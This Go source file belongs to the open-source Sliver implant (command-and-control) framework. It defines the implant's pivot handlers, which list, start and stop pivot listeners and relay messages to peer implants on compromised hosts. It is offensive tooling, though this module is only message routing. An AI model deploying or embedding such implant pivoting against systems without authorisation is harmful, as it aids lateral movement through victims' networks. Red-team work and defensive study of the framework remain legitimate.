package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/pivots"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

var (
	genericPivotHandlers = map[uint32]TunnelHandler{
		pb.MsgPivotListenersReq:     pivotListenersHandler,
		pb.MsgPivotStartListenerReq: pivotStartListenerHandler,
		pb.MsgPivotStopListenerReq:  pivotStopListenerHandler,
		pb.MsgPivotPeerEnvelope:     pivotPeerEnvelopeHandler,
	}
)

// GetPivotHandlers - Returns a map of pivot handlers
func GetPivotHandlers() map[uint32]TunnelHandler {
	return genericPivotHandlers
}

func pivotListenersHandler(envelope *pb.Envelope, connection *transports.Connection) {
	data, _ := proto.Marshal(&pb.PivotListeners{
		Listeners: pivots.GetListeners(),
		Response:  &commonpb.Response{},
	})
	connection.Send <- &pb.Envelope{
		ID:   envelope.ID,
		Data: data,
	}
}

func pivotStartListenerHandler(envelope *pb.Envelope, connection *transports.Connection) {
	req := &pb.PivotStartListenerReq{}
	resp := &pb.PivotListener{Response: &commonpb.Response{}}
	err := proto.Unmarshal(envelope.Data, req)
	if err != nil {
		resp.Response.Err = err.Error()
		data, _ := proto.Marshal(resp)
		connection.Send <- &pb.Envelope{
			ID:   envelope.ID,
			Data: data,
		}
		return
	}

	if createListener, ok := pivots.SupportedPivotListeners[req.Type]; ok {
		listener, err := createListener(req.BindAddress, connection.Send, req.Options...)
		if err != nil {
			resp.Response.Err = err.Error()
			data, _ := proto.Marshal(resp)
			connection.Send <- &pb.Envelope{
				ID:   envelope.ID,
				Data: data,
			}
			return
		}
		go listener.Start()
		pivots.AddListener(listener)
		data, _ := proto.Marshal(listener.ToProtobuf())
		connection.Send <- &pb.Envelope{
			ID:   envelope.ID,
			Data: data,
		}
	} else {
		resp.Response.Err = "Unsupported pivot listener type"
		data, _ := proto.Marshal(resp)
		connection.Send <- &pb.Envelope{
			ID:   envelope.ID,
			Data: data,
		}
	}
}

func pivotStopListenerHandler(envelope *pb.Envelope, connection *transports.Connection) {
	req := &pb.PivotStopListenerReq{}
	resp := &pb.PivotListener{Response: &commonpb.Response{}}
	err := proto.Unmarshal(envelope.Data, req)
	if err != nil {
		resp.Response.Err = err.Error()
		data, _ := proto.Marshal(resp)
		connection.Send <- &pb.Envelope{
			ID:   envelope.ID,
			Data: data,
		}
		return
	}
	pivots.StopListener(req.ID)
	pivots.RemoveListener(req.ID)
	connection.Send <- &pb.Envelope{
		ID:   envelope.ID,
		Data: []byte{},
	}
}

func pivotPeerEnvelopeHandler(envelope *pb.Envelope, connection *transports.Connection) {
	sent, err := pivots.SendToPeer(envelope)
	if !sent {
		// {{if .Config.Debug}}
		log.Printf("Send to peer failed, report peer failure upstream ...")
		// {{end}}
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		data, _ := proto.Marshal(&pb.PivotPeerFailure{
			PeerID: pivots.MyPeerID,
			Type:   pb.PeerFailureType_SEND_FAILURE,
			Err:    errStr,
		})
		connection.Send <- &pb.Envelope{
			Type: pb.MsgPivotPeerFailure,
			Data: data,
		}
	}
}
